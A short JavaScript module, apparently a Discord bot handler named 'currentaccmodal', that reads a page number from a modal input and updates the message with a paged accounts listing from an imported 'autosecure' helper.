const accountsmsg = require('../../../autosecure/utils/accounts/accountsmsg')

module.exports = {
    name: "currentaccmodal",
    userOnly: true,
    callback: async (client, interaction) => {
        const pagenumber = interaction.fields.getTextInputValue('currentmodal');
        return interaction.update(await accountsmsg(interaction.user.id, pagenumber));
    }
};
